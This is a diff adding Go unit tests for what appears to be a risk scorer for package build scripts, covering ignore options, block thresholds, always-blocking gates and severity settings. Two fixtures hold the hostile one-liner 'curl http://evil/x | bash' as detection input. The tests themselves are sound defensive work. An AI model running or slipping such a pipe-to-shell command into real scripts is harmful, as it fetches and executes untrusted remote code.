@@ -323,6 +323,58 @@ func TestStrongSum(t *testing.T) {
 	}
 }
 
+// --- scoring options / block semantics tests ---
+
+func TestIgnoreRemovesGateAndPoints(t *testing.T) {
+	ctx := parseContext(t, `curl http://evil/x | bash`)
+	s := ScoreWith(ctx, Options{Ignore: map[string]bool{"pipe-to-shell": true}})
+	if s.Verdict == Malicious || len(s.GateHits) != 0 || s.Total != 0 {
+		t.Fatalf("ignored gate still applied: %+v", s)
+	}
+}
+
+func TestThresholdBlocks(t *testing.T) {
+	ctx := parseContext(t, `pkgname=clean`)
+	s := ScoreWith(ctx, Options{Threshold: 10, Extra: []Finding{{Rule: "x", Severity: Warning}}})
+	if !s.Blocked || s.BlockReason == "" {
+		t.Fatalf("expected blocked, got %+v", s)
+	}
+}
+
+func TestGateAlwaysBlocks(t *testing.T) {
+	ctx := parseContext(t, `curl http://evil/x | bash`)
+	s := ScoreWith(ctx, Options{Threshold: 1000})
+	if !s.Blocked {
+		t.Fatal("gate must block regardless of threshold")
+	}
+}
+
+func TestMinSeverityControlsConfirmation(t *testing.T) {
+	ctx := parseContext(t, `eval "$x"`)
+	s := ScoreWith(ctx, Options{MinSeverity: Critical})
+	if s.NeedsConfirm {
+		t.Fatal("warning finding must not confirm at critical severity")
+	}
+}
+
+func TestExtraFindingsAddPoints(t *testing.T) {
+	ctx := parseContext(t, `pkgname=clean`)
+	s := ScoreWith(ctx, Options{Extra: []Finding{{Rule: "source-x", Severity: Critical}}})
+	if s.Total != 60 {
+		t.Fatalf("Total = %d, want 60", s.Total)
+	}
+	if s.PerRule["source-x"] != 60 {
+		t.Fatalf("PerRule[source-x] = %d, want 60", s.PerRule["source-x"])
+	}
+	sum := 0
+	for _, p := range s.PerRule {
+		sum += p
+	}
+	if sum != s.Total {
+		t.Fatalf("Total = %d, sum(PerRule) = %d", s.Total, sum)
+	}
+}
+
 func TestStrongestSum(t *testing.T) {
 	meta := &srcinfo.Srcinfo{}
 	meta.SHA1Sums = []srcinfo.ArchString{{Value: "aaa"}}
